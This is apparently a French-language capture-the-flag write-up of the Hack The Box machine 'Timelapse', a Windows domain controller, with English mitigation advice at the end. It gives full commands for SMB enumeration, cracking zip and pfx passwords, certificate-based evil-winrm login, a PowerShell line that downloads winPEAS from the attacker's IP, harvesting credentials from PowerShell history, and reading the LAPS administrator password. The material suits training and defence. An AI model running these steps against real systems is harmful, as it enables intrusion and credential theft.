# Timelapse

Voici mon write-up de la box Timelapse qui aura duré au total 2h30 pour la compromettre entièrement.
L'IP qui m'était attribué par le VPN était 10.10.14.4 et l'IP de la machine est 10.10.11.152.

## Enumeration

On commence tout d'abord avec une énumération via nmap :

```
nmap -Pn -sC -sV -p- -o nmap/timelapse.nmap 10.10.11.152
```
La machine est opérationnelle, par conséquent, pas besoin de ping (-Pn). 
On exécute les scripts NSE traditionnels (-sC) et on demande la version de chaque service trouvé (-sV). 
Le tout en allant chercher tous les ports existants (-p-).
nnma
Résultat :

```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-07-01 17:38:31Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2022-07-01T17:41:29+00:00; +7h59m59s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf            .NET Message Framing
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
62988/tcp open  msrpc             Microsoft Windows RPC
```

Au vu des ports on remarque que cette box tourne sur un environnement Windows Active Directory. On pense tout d'abord à ajouter le domaine _timelapse.htb_ dans le fichier
_/etc/hosts_ afin de faire la résolution DNS.

```
10.10.11.152    timelapse.htb
```
C'est parti pour check les services les plus connues  :

## Service LDAP (Port 389/3268)

On tente un classique qui est de se connecter en tant qu'anonyme sur le service ldap via ldapsearch :

```
ldapsearch -H ldap://10.10.11.152 -x -b DC=timelapse,DC=htb
ldapsearch -H ldap://10.10.11.152 -x -b DC=htb,DC=local
```
On tente donc une connexion ldap sur l'ip de la machine (-H) en liaison anonyme (-x) sur le basedn timelapse.htb et htb.local (-b) sait-on jamais.
On a rien de concluant en sortie, passons au service suivant.

## Service SMB (Port 445)

(https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)
On énumère tout d'abord les shares SMB via smbclient :

```
smbclient -L timelapse.htb # -L permet de lister les shares

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Shares          Disk      
SYSVOL          Disk      Logon server share 
```
L'accès aux shares SMB semblent être possible sans s'authentifier. On tente de se connecter d'abord au share C$, pas possible. Puis je tente de me connecter
au share Shares qui me semble plutôt louche (pas de Commentaire notamment).

```
smbclient \\\\timelapse.htb\\Shares -I 10.10.11.152 -u guest 
```
On se connecte bien au share dans lequel on retrouve d'une part, un dossier HelpDesk contenant l'executable du service LAPS (que l'on verra par la suite) et des documents.
Un autre dossier Dev, contient un fichier du nom de winrm_backup.zip, on le récupère via `mget winrim_backup.zip` puis on tente de le dézipper.
Il s'avère que celui-ci est protégé par un mot de passe.

Ayant déjà rencontré des zip protégés par mot de passe (notamment via le défi Root-Me `Fichier - PKZIP`), j'ai su rapidement retrouvé le mot de passe me permettant
d'accéder au fichier :

```
john-the-ripper.zip2john winrm_backup.zip > hash # Permet d'extraire le hash sous un format que john pourra traiter
john --fork=4 --wordlist=/home/ibra/enum-lists/rockyou.txt hash 
john --show hash # winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy
```

On extrait un fichier nommé `legacyy_dev_auth.pfx` en entrant le mot de passe `supremelegacy`.

## Extraction des clés et connexion WinRM

En voulant m'intéresser au format pfx, j'ai trouvé une excellente doc d'IBM à ce [sujet](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file).

Celui-ci nous explique qu'un fichier pfx permet de contenir un certificat SSL contenant la clé publique et la clé privé correspondant au certificat.
Cependant pour pouvoir extraire ses informations, il faut un mot de passe pour y accéder. 

Nous répétons donc (quasiment) le même procédé qu'avec le zip protégé :

```
john ne fournit pas d'executable permettant d'extraire un format de hash à partir d'un pfx. Cependant il existe sur GitHub un programme permettant de nous
rendre ce service là.

Repository : https://github.com/sirrushoo/python

python2.7 pfx2john.py legacyy_dev_auth.pfx > hashpfx 
john --fork=4 --format=pfx-opencl --wordlist=/home/ibra/enum-lists/rockyou.txt hashpfx
john --show hashpfx # legacyy_dev_auth.pfx:thuglegacy:::::legacyy_dev_auth.pfx
```

Il nous reste donc plus qu'à extraire le certificat et la clé privée associée. Ca tombe bien car la documentation d'IBM nous indique directement comment s'y prendre.

```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out cert.pem # certificat
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem # clé privé
```

J'ai ensuite longtemps cherché comment m'y prendre pour la suite, ce dont j'étais sûr c'est qu'il fallait que je me connecte sur un service avec ces
deux informations. En repassant sur mon output nmap, je remarque qu'un service particulièrement intéressant qui tourne sur du http/https : **winrm (5986)**.

Déjà rencontré auparavant, j'ai donc tenté d'utiliser l'outil evil-winrm me permettant de me connecter à distance au bureau d'un utilisateur du domaine.
Il se trouve que le certificat appartient à un dénommé `legacyy` et qu'il est possible via evil-winrm de se connecter par le biais d'un certificat ssl (clé publique) et la clé privée.

En lisant un peu la doc, on peut activer la connexion SSL, filé le certificat et la clé privée.

```
evil-winrm -i 10.10.11.152 -S -c cert.pem -k key.pem 

*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat "C:/Users/legacyy/Desktop/user.txt"
```

## Escalation de privilèges par mouvement latéral

Premier réflexe : effectué un whoami /all afin d'avoir tous les détails sur mes permissions et mes appartenances :

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ============================================
timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

On remarque que legacyy fait partie du groupe Development, à part cela, le reste semble tout à fait correct. Un des premiers réflexes après cela serait d'effectuer
une énumération du domaine et une analyse par graphe par le biais de Bloodhound mais on n'a pas de mot de passe à lui fournir et il ne traite pas les certificats.

Je me suis dit que c'était une box facile, alors il ne fallait pas chercher très loin, comme sur du Linux, j'essaye d'installer winpeas afin d'avoir 
de potentielles vecteurs d'attaques.

En tentant de multiples moyens de télécharger winpeas.bat j'ai trouvé ce moyen :
̀(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.4:8080/winPEAS.bat", "C:\Users\legacyy\Music\winpeas.bat")`

Cependant il m'est impossible d'executer le fichier à cause de l'antivirus qui tourne derrière. Je suis donc passé par la lecture de winpeas en testant les payloads
payloads intéressantes. Ce qui m'a amené à l'historique des commandes :

```
La commande de winpeas :
dir "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul
Ma commande :
ls C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ # %APPDATA% = C:\Users\USERNAME\AppData\Roaming
```

Nous avons en résultat ceci :

```
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

Pour faire simple, les commandes suivantes créent un mot de passe sécurisé, l'assigne à un utilisateur du nom de `svc_deploy` puis on execute
du powershell en remote par le biais winrm en s'authentifiant en tant que `svc_deploy`.
On a du winrm, on a le nom d'utilisateur et son mot de passe, on peut donc supposément monter en privilège en se connectant sur le bureau de `svc_deploy`.

```
evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

On procède de la même manière en regardant nos groupes et privilèges (via `whoami /all`) et on remarque directement que l'on fait maintenant partie 
d'un groupe nommé `LAPS_Readers`.
LAPS (Local Administrator Password Service) fournit une gestion des mots de passes des comptes locaux. Ses mots de passes sont stockés dans l'Active Directory
et protégés par le biais des ACLs : seuls les utilisateurs autorisés peuvent lire les mots de passes des utilisateurs locaux.

Parfait, il nous reste donc plus qu'à lire le mot de passe de l'administrateur. La documentation de [Microsoft](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/you-might-want-to-audit-your-laps-permissions/ba-p/2280785) fournit une commande permettant d'extraire le mot de passe
du DC (de l'admin du coup) :

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter * -Properties MS-Mcs-AdmPwd | Where-Object MS-Mcs-AdmPwd -ne $null | FT Name, MS-Mcs-AdmPwd

Name MS-Mcs-AdmPwd
---- -------------
DC01 q2r47N};-Y5]v%/16R-X!1ni
```
Enfin, toujours via evil-winrm, on se connecte en tant qu'Administrateur :
`evil-winrm -i 10.10.11.152 -S -u administrator -p 'q2r47N};-Y5]v%/16R-X!1ni'`

Mitigations :

In the end, quite a few vulnerabilities were present and many of them are misconfigurations. To fix them, applying the following patches :

- Enforce read and write permissions to various SMB shares and dont store sensitive information
- Implement a strong password policy : one upper case, one lower case, one number and one special character required, 12 characters minimum
- Do not keep Powershell commands history or strongly reinforce its access by changing the configuration the account configuration
- Do not grant privileged rights to extract sensitive information in case of compromission, except to the domain controller. Hence, it is recommended to integrate additional security measures with the implementation of LAPS.
